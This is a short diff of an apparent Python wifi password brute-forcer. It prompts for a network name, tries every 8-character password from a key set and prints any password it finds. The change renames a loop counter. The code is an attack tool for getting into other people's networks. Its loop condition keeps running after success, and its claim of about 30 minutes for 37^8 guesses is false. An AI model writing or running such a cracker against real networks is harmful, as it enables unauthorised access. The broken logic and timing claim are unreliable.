@@ -51,14 +51,14 @@ key_set = "abcdefghijklmnopqrstuvwxyz0123456789@"
 # key_set = "abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-`~;:'\"\\/?.>,<[]{}|=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
 
 found = False
-i = 1
+starting_count = 1
 
 wifi_name = input("Please type the name of the wifi: ")
 print("Please wait.......this may take upto 30 (or more) minutes!!")
 
 start = time.time()
 
-while not found or found < 50:
+while not found or starting_count < 50:
     pass_iter = itertools.product(key_set, repeat=8)
 
     for password in pass_iter:
@@ -69,7 +69,7 @@ while not found or found < 50:
             print(f"Password for {wifi_name} found in {end - start} seconds: {validation}")
             found = True
 
-    i += 1
+    starting_count += 1
 
 if not found:
     print("Password not found using this key set.....try the second one!")
